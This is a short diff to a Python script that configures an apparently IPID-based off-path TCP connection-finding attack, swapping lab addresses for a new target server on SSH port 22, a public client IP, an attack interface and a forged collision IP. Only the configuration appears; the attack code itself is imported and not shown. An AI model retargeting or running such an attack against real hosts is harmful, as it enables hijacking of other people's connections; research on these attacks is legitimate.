@@ -8,15 +8,15 @@ from IPID_HCSC.ack_find import *
 
 
 if __name__ == '__main__':
-    server_mac = '00:0c:29:20:f4:8c'
-    server_ip = '10.10.100.2'
+    server_mac = '52:54:00:df:b4:7e'
+    server_ip = '172.21.0.16'
     server_port = 22
 
-    client_ip = '10.10.100.1'
+    client_ip = '182.92.129.182'
 
-    attack_bind_if = 'ens33'
+    attack_bind_if = 'eth0'
     own_ip_prefix = '10.10.0.0'
-    collision_ip = '10.10.16.92'
+    collision_ip = '10.10.15.86'
 
     connection = Connection_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                                    server_port=server_port, server_mac=server_mac, bind_if_name=attack_bind_if)
